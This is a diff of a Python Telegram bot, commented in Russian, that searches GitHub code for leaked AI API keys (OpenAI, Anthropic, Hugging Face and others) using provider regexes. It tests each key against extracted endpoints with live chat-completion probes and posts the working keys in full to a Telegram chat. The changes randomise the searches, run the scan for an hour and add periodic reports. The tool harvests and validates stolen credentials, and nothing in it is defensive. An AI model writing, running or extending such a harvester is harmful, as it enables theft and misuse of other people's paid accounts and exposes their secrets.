@@ -5,6 +5,7 @@ import time
 import requests
 import logging
 import asyncio
+import random
 
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
@@ -16,7 +17,10 @@ BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# Паттерны ключей
+# Настройки времени
+TOTAL_RUN_TIME = 3600  # Работать 1 час (3600 секунд)
+REPORT_INTERVAL = 900  # Присылать отчет каждые 15 минут (900 секунд)
+
 KEY_PATTERNS = [
     {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
@@ -29,39 +33,35 @@ KEY_PATTERNS = [
     {"provider": "generic-sk",  "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
 ]
 
-# Паттерн для поиска URL
 URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')
 
-def identify_key(token):
-    for p in KEY_PATTERNS:
-        if p["regex"].fullmatch(token):
-            return p["provider"]
-    return None
-
 def fetch_targets():
-    logger.info("🔎 Начинаю поиск ключей и эндпоинтов на GitHub...")
+    logger.info("🔎 Ищу ключи и эндпоинты на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
-    query = "sk- OR hf_ language:Python OR language:JavaScript"
+    
+    # Рандомизируем запрос и страницу, чтобы искать разные файлы
+    queries = ["sk- language:Python", "sk- language:JavaScript", "sk- language:TypeScript", "hf_ language:Python"]
+    query = random.choice(queries)
+    page = random.randint(1, 5)
     
     try:
-        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30}, timeout=15)
+        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30, "page": page}, timeout=15)
         if resp.status_code == 403:
-            logger.error("❌ ОШИБКА 403: Токен не подходит. Нужен Classic Token с public_repo!")
+            logger.error("❌ ОШИБКА 403: Токен не подходит. Нужен Classic Token!")
             return []
         resp.raise_for_status()
         
         items = resp.json().get("items", [])
-        logger.info(f"✅ Найдено файлов: {len(items)}")
+        logger.info(f"✅ Найдено файлов на странице {page}: {len(items)}")
         
         targets = []
-        for item in items[:20]:
+        for item in items[:15]: # Проверяем 15 файлов за раз
             repo = item["repository"]["full_name"]
             path = item["path"]
             file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
             
             if file_resp.status_code == 200:
                 text = file_resp.text
-                
                 urls = URL_REGEX.findall(text)
                 valid_urls = [u for u in urls if 'github.com' not in u and 'telegram' not in u and 'w3.org' not in u]
                 api_urls = [u for u in valid_urls if u.endswith('/v1') or '/v1/' in u]
@@ -79,6 +79,7 @@ def fetch_targets():
                             targets.append({"key": token, "endpoint": "https://chat.kxsb.org/api/v1", "provider": p["provider"]})
             time.sleep(1)
             
+        # Дедупликация
         unique_targets = []
         seen = set()
         for t in targets:
@@ -87,7 +88,6 @@ def fetch_targets():
                 seen.add(sig)
                 unique_targets.append(t)
                 
-        logger.info(f"🔑 Извлечено уникальных пар (ключ+эндпоинт): {len(unique_targets)}")
         return unique_targets
     except Exception as e:
         logger.error(f"❌ Ошибка поиска: {e}")
@@ -104,17 +104,16 @@ def check_endpoint(api_key, endpoint):
 
 def probe_models(api_key, endpoint, models):
     results = []
-    for model in models[:7]:
+    for model in models[:5]: # Уменьшили до 5 для скорости
         payload = {"model": model, "messages": [{"role": "user", "content": "pong"}], "max_tokens": 5}
         start = time.perf_counter()
         try:
-            resp = requests.post(f"{endpoint}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=15)
+            resp = requests.post(f"{endpoint}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=10)
             latency = round(time.perf_counter() - start, 2)
             ok = resp.status_code == 200
-            msg = resp.text[:80].replace("\n", " ").strip() if not ok else "OK"
-        except Exception as e:
-            ok, latency, msg = False, "?", str(e)
-        results.append({"model": model, "ok": ok, "status": getattr(resp, 'status_code', 'ERR'), "latency": latency, "msg": msg})
+        except Exception:
+            ok, latency = False, "?"
+        results.append({"model": model, "ok": ok, "latency": latency})
     return results
 
 def format_report(key, endpoint, models, probes):
@@ -129,59 +128,82 @@ def format_report(key, endpoint, models, probes):
         f"🗝 Ключ — {key}",
         "✅ Работают —"
     ]
-    
     for p in working:
         lines.append(f"{p['model']} — {p['latency']}s (pong)")
         
     lines.append(f"📦 Все модели — " + ", ".join(models[:5]))
     if len(models) > 5:
         lines.append(f"и ещё {len(models) - 5} за кадром")
-        
     return "\n".join(lines)
 
-async def run_scan():
-    targets = fetch_targets()
+async def long_scan_loop():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
+    checked_keys = set() # <-- ДОБАВИТЬ ЭТО (память для текущего часа)
+    start_time = time.time()
+    cycle_start_time = time.time()
     
-    if not targets:
-        logger.info("🤷 Ключей не найдено. Завершаю.")
-        return
-
-    working_count = 0
+    total_checked = 0
+    total_working = 0
+    cycle_working = 0
     
-    for t in targets:
-        key, endpoint, provider = t["key"], t["endpoint"], t["provider"]
-        logger.info(f"Проверяю {key[:10]}... на {endpoint}")
+    logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
+    
+    while time.time() - start_time < TOTAL_RUN_TIME:
+        # Поиск (в отдельном потоке, чтобы не блокировать бота)
+        targets = await asyncio.to_thread(fetch_targets)
+        total_checked += len(targets)
         
-        models = check_endpoint(key, endpoint)
-        if not models:
-            logger.info("   └ Мертвый (нет доступа к /models)")
-            continue
+        for t in targets:
+            key, endpoint = t["key"], t["endpoint"]
             
-        logger.info(f"   └ Доступно моделей: {len(models)}. Делаю пробы...")
-        probes = probe_models(key, endpoint, models)
+            # --- КЭШ ---
+            if key in checked_keys:
+                continue
+            checked_keys.add(key)
+            # -----------
+            
+            logger.info(f"Проверяю {key[:10]}... на {endpoint}")
+            models = await asyncio.to_thread(check_endpoint, key, endpoint)
+            if not models:
+                continue
+                
+            probes = await asyncio.to_thread(probe_models, key, endpoint, models)
+            report = format_report(key, endpoint, models, probes)
+            
+            if report:
+                total_working += 1
+                cycle_working += 1
+                if CHAT_ID:
+                    await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
+                logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
         
-        report = format_report(key, endpoint, models, probes)
-        if report:
-            working_count += 1
+        # Проверка времени для промежуточного отчета
+        if time.time() - cycle_start_time >= REPORT_INTERVAL:
+            summary = (
+                f"⏳ **Промежуточный отчет**\n"
+                f"За последние {REPORT_INTERVAL//60} минут:\n"
+                f"Проверено целей: {total_checked}\n"
+                f"Найдено рабочих: {cycle_working}\n\n"
+                f"Бот продолжает работу..."
+            )
             if CHAT_ID:
-                await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
-            logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
-        else:
-            logger.info("   └ Мертвый (все пробы 401/403)")
+                await app.bot.send_message(chat_id=CHAT_ID, text=summary, parse_mode="Markdown")
+            
+            # Сброс цикла
+            cycle_start_time = time.time()
+            cycle_working = 0
+            
+        # Пауза 10 секунд перед следующим кругом
+        await asyncio.sleep(10)
 
-    # Отчет о завершении
+    # Финальный отчет
     if CHAT_ID:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f"🤖 Скан завершен. Проверено целей: {len(targets)}. Рабочих: {working_count}")
-
-    logger.info(f"✅ Сессия завершена. Отправлено рабочих ключей: {working_count}.")
-
-async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Бот работает. Ищу ключи в фоне.")
+        await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Скан завершен. Всего рабочих ключей: {total_working}")
+    logger.info("✅ Длинная сессия завершена.")
 
 if __name__ == "__main__":
     if not BOT_TOKEN or not GITHUB_TOKEN:
-        logger.error("Нет токенов в переменных окружения!")
+        logger.error("Нет токенов!")
         sys.exit(1)
     
-    asyncio.run(run_scan())
+    asyncio.run(long_scan_loop())
